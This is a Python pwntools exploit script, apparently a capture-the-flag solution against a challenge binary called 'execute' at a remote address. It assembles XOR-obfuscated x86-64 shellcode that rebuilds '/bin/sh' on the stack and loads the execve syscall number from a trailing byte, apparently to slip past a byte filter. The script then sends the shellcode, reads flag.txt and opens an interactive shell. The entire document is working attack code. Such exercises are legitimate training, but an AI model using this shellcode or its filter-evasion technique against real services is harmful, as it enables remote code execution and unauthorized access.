#("94.237.50.221", 37685)
from pwn import *
import shutil, os
import argparse

context.arch = 'amd64'

# Build shellcode
code = '''
    mov rax, 0x87ac32aa79ad3c42
    push rax
    xor dword ptr [rsp], 0x17c45e6d
    xor dword ptr [rsp+4], 0x87c44185
    mov rdi, rsp
    xor ebx, ebx
    mov esi, ebx
    mov edx, ebx
    mov eax, ebx
    mov al, byte ptr [rip+0x10]
    syscall
''' + 'nop\n' * 14 + '.byte 0x3b\n'

sc = asm(code)
assert len(sc) == 60 and sc[-1] == 0x3b

# Handle args
parser = argparse.ArgumentParser()
parser.add_argument('--remote', action='store_true', help='Use remote connection')
args = parser.parse_args()

if args.remote:
    p = remote("94.237.50.221", 37685)
else:
    binary = './execute'
    local_bin = '/tmp/execute'
    shutil.copy(binary, local_bin)
    os.chmod(local_bin, 0o755)
    p = process(local_bin)

# Shellcode delivery
try:
    banner = p.recvline(timeout=3).decode(errors='ignore')
    log.info(f"Received: {banner.strip()}")
except EOFError:
    log.warning("No banner or early EOF")

p.send(sc)
p.sendline(b'cat flag.txt')
# If shell is expected, switch directly
log.info("Switching to interactive shell")
p.interactive()
